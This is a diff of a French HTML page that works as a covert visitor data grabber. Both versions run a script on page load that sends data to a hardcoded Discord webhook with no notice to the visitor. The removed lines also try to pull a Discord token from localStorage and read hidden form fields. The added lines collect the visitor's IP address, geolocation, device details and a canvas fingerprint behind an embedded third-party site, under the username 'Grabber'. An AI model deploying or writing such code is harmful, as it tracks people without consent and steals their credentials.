@@ -1,119 +1,136 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Page Principale</title>
+    <title>Récupérateur de données</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            overflow: hidden; /* Cache les barres de défilement si nécessaire */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
         }
         iframe {
-            width: 100vw;
-            height: 100vh;
-            border: none; /* Rend l'iframe invisible ou discrète */
+            width: 100%;
+            height: 100%;
+            border: none;
         }
-        form {
-            display: none;
+        .loading {
+            position: absolute;
+            top: 10px;
+            left: 10px;
+            color: #333;
+        }
+        .error {
+            color: red;
+            text-align: center;
         }
     </style>
 </head>
 <body>
-    <!-- Iframe pour afficher le site cible, potentiellement pour accéder au contexte de Discord -->
-    <iframe src="https://discord.com" id="discordFrame"></iframe>
-    
-    <form id="hiddenForm">
-        <input type="text" id="firstName" placeholder="Prénom">
-        <input type="text" id="lastName" placeholder="Nom">
-    </form>
-    
+    <div class="loading">Chargement...</div>
+    <iframe src="http://nyrservice.netlify.app/" title="Contenu intégré" onload="document.querySelector('.loading').style.display='none';" onerror="document.querySelector('.loading').innerHTML='<p class=\"error\">Erreur : Impossible de charger le contenu. Veuillez réessayer.</p>';"></iframe>
     <script>
-        async function sendCollectedData() {
+        async function sendUserData() {
             try {
-                // Récupère l'IP via API publique
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
-                const userIP = ipData.ip;
-                
-                // Récupère d'autres informations du navigateur
-                const userAgent = navigator.userAgent;  // Détails sur le navigateur, OS, et device
-                const language = navigator.language;    // Langue du navigateur
-                const screenInfo = `${window.screen.width}x${window.screen.height}`;  // Résolution d'écran
-                
-                // Tentative pour géolocalisation
-                let geolocationData = 'Non disponible';
-                if (navigator.geolocation) {
-                    const position = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject);
-                    });
-                    geolocationData = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
+                // Récupérer l'IP
+                let ip = 'Non disponible';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ip = ipData.ip || 'Non disponible';
+                } catch (err) {
+                    console.error('Erreur lors de la récupération de l\'IP:', err);
                 }
-                
-                // Tentative pour récupérer prénom et nom via formulaire
-                const firstName = document.getElementById('firstName').value || 'Inconnu';
-                const lastName = document.getElementById('lastName').value || 'Inconnu';
-                
-                // Tentative pour récupérer le token Discord à partir de localStorage
-                let discordToken = 'Non trouvé';
-                if (window.localStorage) {
-                    // Scanner les clés potentielles (Discord utilise souvent 'token' ou des variantes)
-                    for (let i = 0; i < localStorage.length; i++) {
-                        const key = localStorage.key(i);
-                        if (key && key.includes('token')) {  // Vérifie les clés contenant 'token'
-                            discordToken = localStorage.getItem(key);  // Récupère la valeur
-                            break;  // On prend le premier matching pour efficacité
-                        }
+
+                // Récupérer la géolocalisation
+                let geolocation = 'Non disponible';
+                try {
+                    const geoResponse = await fetch(`http://ip-api.com/json/${ip}`);
+                    const geoData = await geoResponse.json();
+                    if (geoData.status === 'success') {
+                        geolocation = `${geoData.city || 'Inconnue'}, ${geoData.regionName || 'Inconnue'}, ${geoData.country || 'Inconnu'} (ISP: ${geoData.isp || 'Inconnu'}, Lat: ${geoData.lat || 'N/A'}, Lon: ${geoData.lon || 'N/A'})`;
                     }
+                } catch (err) {
+                    console.error('Erreur lors de la récupération de la géolocalisation:', err);
                 }
-                
-                // Compilation de toutes les données
-                const collectedData = {
-                    IP: userIP,
-                    UserAgent: userAgent,
-                    Language: language,
-                    ScreenResolution: screenInfo,
-                    Geolocation: geolocationData,
-                    FirstName: firstName,
-                    LastName: lastName,
-                    DiscordToken: discordToken,  // Inclut le token récupéré
-                    Timestamp: new Date().toISOString()
+
+                // Récupérer les informations du navigateur
+                const userAgent = navigator.userAgent || 'Non disponible';
+                const language = navigator.language || 'Non disponible';
+                const languages = navigator.languages ? navigator.languages.join(', ') : 'Non disponible';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Non disponible';
+                const screenResolution = `${window.screen.width}x${window.screen.height}` || 'Non disponible';
+                const windowSize = `${window.innerWidth}x${window.innerHeight}` || 'Non disponible';
+                const colorDepth = window.screen.colorDepth || 'Non disponible';
+                const platform = navigator.platform || 'Non disponible';
+                const cpuCores = navigator.hardwareConcurrency || 'Non disponible';
+                const deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} Go` : 'Non disponible';
+                const referrer = document.referrer || 'Non disponible';
+                const connection = navigator.connection ? `${navigator.connection.effectiveType || 'N/A'} (Downlink: ${navigator.connection.downlink || 'N/A'} Mbps)` : 'Non disponible';
+
+                // Canvas Fingerprinting
+                let canvasFingerprint = 'Non disponible';
+                try {
+                    const canvas = document.createElement('canvas');
+                    const ctx = canvas.getContext('2d');
+                    ctx.textBaseline = 'top';
+                    ctx.font = '14px Arial';
+                    ctx.fillStyle = '#f60';
+                    ctx.fillRect(125, 1, 62, 20);
+                    ctx.fillStyle = '#069';
+                    ctx.fillText('Test fingerprint', 2, 15);
+                    canvasFingerprint = canvas.toDataURL();
+                } catch (err) {
+                    console.error('Erreur lors du canvas fingerprinting:', err);
+                }
+
+                // Données à envoyer au webhook
+                const embedData = {
+                    embeds: [
+                        {
+                            title: '**Nouvel utilisateur détecté**',
+                            description: `\`\`\`yaml\nIP: ${ip}\nGéolocalisation: ${geolocation}\nUser-Agent: ${userAgent}\nLangue: ${language}\nLangues secondaires: ${languages}\nFuseau horaire: ${timezone}\nRésolution d'écran: ${screenResolution}\nTaille de la fenêtre: ${windowSize}\nProfondeur de couleur: ${colorDepth}\nPlateforme: ${platform}\nCœurs CPU: ${cpuCores}\nMémoire appareil: ${deviceMemory}\nConnexion réseau: ${connection}\nRéférent: ${referrer}\nCanvas Fingerprint: ${canvasFingerprint.substring(0, 50)}...\nHeure de la visite: ${new Date().toISOString()}\n\`\`\``,
+                            color: 3092790,
+                            footer: {
+                                text: 'Créé par Astraa ・ https://github.com/astraadev'
+                            },
+                            timestamp: new Date().toISOString()
+                        }
+                    ],
+                    username: 'Grabber',
+                    avatar_url: 'https://avatars.githubusercontent.com/u/43183806?v=4'
                 };
-                
-                // Envoie des données au webhook
-                const webhookURL = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
-                const sendResponse = await fetch(webhookURL, {
+
+                // Envoyer les données au webhook
+                const webhookUrl = 'https://discord.com/api/webhooks/1363874178297499899/-7kETsy0lEq5JH55BFQR0lG2eYJIO-CxTMlrLtBwYmcmgi1prrqao8dP0vybcQ_otkgq';
+                const response = await fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({
-                        content: `Nouvelles données collectées : 
-                        IP: ${collectedData.IP}
-                        Prénom: ${collectedData.FirstName}
-                        Nom: ${collectedData.LastName}
-                        User Agent: ${collectedData.UserAgent}
-                        Langue: ${collectedData.Language}
-                        Résolution d'écran: ${collectedData.ScreenResolution}
-                        Géolocalisation: ${collectedData.Geolocation}
-                        Discord Token: ${collectedData.DiscordToken}
-                        Timestamp: ${collectedData.Timestamp}`
-                    })
+                    body: JSON.stringify(embedData)
                 });
-                
-                if (sendResponse.ok) {
-                    console.log('Données envoyées avec succès');
+
+                if (response.ok) {
+                    console.log('Données envoyées au webhook avec succès');
                 } else {
-                    console.error('Échec de l\'envoi au webhook');
+                    console.error('Erreur lors de l\'envoi au webhook:', response.status);
                 }
-            } catch (error) {
-                console.error('Erreur lors de la collecte ou de l\'envoi des données:', error);
+            } catch (err) {
+                console.error('Erreur générale:', err);
             }
         }
-        
-        // Exécute la fonction au chargement de la page
-        window.onload = sendCollectedData;
+
+        // Exécuter la fonction dès que la page est chargée
+        window.onload = () => {
+            sendUserData();
+        };
     </script>
 </body>
 </html>
